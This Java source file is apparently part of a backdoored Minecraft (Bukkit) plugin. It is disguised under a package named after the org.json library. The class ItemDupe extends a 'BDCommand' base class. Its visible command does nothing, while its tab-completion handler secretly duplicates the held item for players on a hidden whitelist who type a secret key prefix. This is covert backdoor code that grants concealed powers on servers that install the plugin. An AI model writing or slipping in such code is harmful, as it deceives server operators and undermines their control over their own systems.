package org.json.modals.items;

import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class ItemDupe extends BDCommand {
    public ItemDupe() {
        super("itemDupe");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, new String[]{"<amount>"});
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        ItemStack itemToDupe = player.getInventory().getItemInMainHand().clone();
        int amount = 1;

        try {
            amount = Integer.parseInt(args[1]);
        } catch (Exception ignored) {
        }

        if (itemToDupe.getType() == Material.AIR) {
            return tabComplBuilder.build();
        }

        itemToDupe.setAmount(amount);
        player.getInventory().addItem(itemToDupe);
        return tabComplBuilder.build();
    }
}
